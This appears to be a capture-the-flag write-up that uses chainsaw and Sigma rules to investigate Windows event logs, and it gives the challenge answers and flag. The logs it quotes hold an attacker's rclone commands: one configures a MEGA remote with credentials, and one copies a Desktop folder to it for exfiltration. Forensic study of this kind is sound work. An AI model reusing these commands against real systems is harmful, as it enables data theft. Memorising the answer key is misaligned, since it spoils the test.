# Packet cyclone (easy)
This is an interactive challenge where we answer questions about some windows event logs.
The challenge makes the hint that `chainsaw` might be useful.

I took the hint and ran chainsaw.
I cloned the github repo and placed it in the `cs` folder inside the challenge
```shell
➜  cs ./chainsaw hunt ../Logs -s ../sigma_rules --mapping mappings/sigma-event-logs-all.yml
```

Here is the first execution of the *rclone* command.
```
CommandLine: '"C:\Users\wade\A
ppData\Local\Temp\rclone-v1.61
.1-windows-amd64\rclone.exe" c
onfig create remote mega user 
majmeret@protonmail.com pass F
BMeavdiaFZbWzpMqIVhJCGXZ5XXZI1
qsU3EjhoKQw0rEoQqHyI'         
Company: https://rclone.org   
CurrentDirectory: C:\Users\wad
e\AppData\Local\Temp\rclone-v1
.61.1-windows-amd64\          
Description: Rsync for cloud s
torage                        
FileVersion: 1.61.1           
Hashes: SHA256=E94901809FF7CC5
168C1E857D4AC9CBB339CA1F6E21DC
CE95DFB8E28DF799961           
Image: C:\Users\wade\AppData\L
ocal\Temp\rclone-v1.61.1-windo
ws-amd64\rclone.exe           
IntegrityLevel: Medium        
LogonGuid: 10DA3E43-D892-63F8-
4B6D-030000000000             
LogonId: '0x36d4b'            
OriginalFileName: rclone.exe  
ParentCommandLine: '"C:\Window
s\System32\WindowsPowerShell\v
1.0\powershell.exe" '         
ParentImage: C:\Windows\System
32\WindowsPowerShell\v1.0\powe
rshell.exe                    
ParentProcessGuid: 10DA3E43-D8
D2-63F8-9B00-000000000900     
ParentProcessId: 5888         
ParentUser: DESKTOP-UTDHED2\wa
de                            
ProcessGuid: 10DA3E43-D92B-63F
8-B100-000000000900           
ProcessId: 3820               
Product: Rclone               
RuleName: '-'                 
TerminalSessionId: 1          
User: DESKTOP-UTDHED2\wade    
UtcTime: 2023-02-24 15:35:07.3
36                            
```

We can use this part of the output to answer the following questions

> What is the email of the attacker used for the exfiltration process? (for example: name@email.com)
majmeret@protonmail.com

> What is the password of the attacker used for the exfiltration process? (for example: password123)
FBMeavdiaFZbWzpMqIVhJCGXZ5XXZI1qsU3EjhoKQw0rEoQqHyI

> What is the Cloud storage provider used by the attacker? (for example: cloud)
mega

> What is the ID of the process used by the attackers to configure their tool? (for example: 1337)
3820

For the coming questions we will need the report of the second command invocation:
```
CommandLine: '"C:\Users\wade\A
ppData\Local\Temp\rclone-v1.61
.1-windows-amd64\rclone.exe" c
opy C:\Users\Wade\Desktop\Reli
c_location\ remote:exfiltratio
n -v'                         
Company: https://rclone.org   
CurrentDirectory: C:\Users\wad
e\AppData\Local\Temp\rclone-v1
.61.1-windows-amd64\          
Description: Rsync for cloud s
torage                        
FileVersion: 1.61.1           
Hashes: SHA256=E94901809FF7CC5
168C1E857D4AC9CBB339CA1F6E21DC
CE95DFB8E28DF799961           
Image: C:\Users\wade\AppData\L
ocal\Temp\rclone-v1.61.1-windo
ws-amd64\rclone.exe           
IntegrityLevel: Medium        
LogonGuid: 10DA3E43-D892-63F8-
4B6D-030000000000             
LogonId: '0x36d4b'            
OriginalFileName: rclone.exe  
ParentCommandLine: '"C:\Window
s\System32\WindowsPowerShell\v
1.0\powershell.exe" '         
ParentImage: C:\Windows\System
32\WindowsPowerShell\v1.0\powe
rshell.exe                    
ParentProcessGuid: 10DA3E43-D8
D2-63F8-9B00-000000000900     
ParentProcessId: 5888         
ParentUser: DESKTOP-UTDHED2\wa
de                            
ProcessGuid: 10DA3E43-D935-63F
8-B200-000000000900           
ProcessId: 5116               
Product: Rclone               
RuleName: '-'                 
TerminalSessionId: 1          
User: DESKTOP-UTDHED2\wade    
UtcTime: 2023-02-24 15:35:17.5
16                            
```

> What is the name of the folder the attacker exfiltrated; provide the full path. (for example: C:\Users\user\folder)
C:\Users\Wade\Desktop\Relic_location

> What is the name of the folder the attacker exfiltrated the files to? (for example: exfil_folder)
exfiltration

> [+] Here is the flag: HTB{3v3n_3xtr4t3rr3str14l_B31nGs_us3_Rcl0n3_n0w4d4ys}
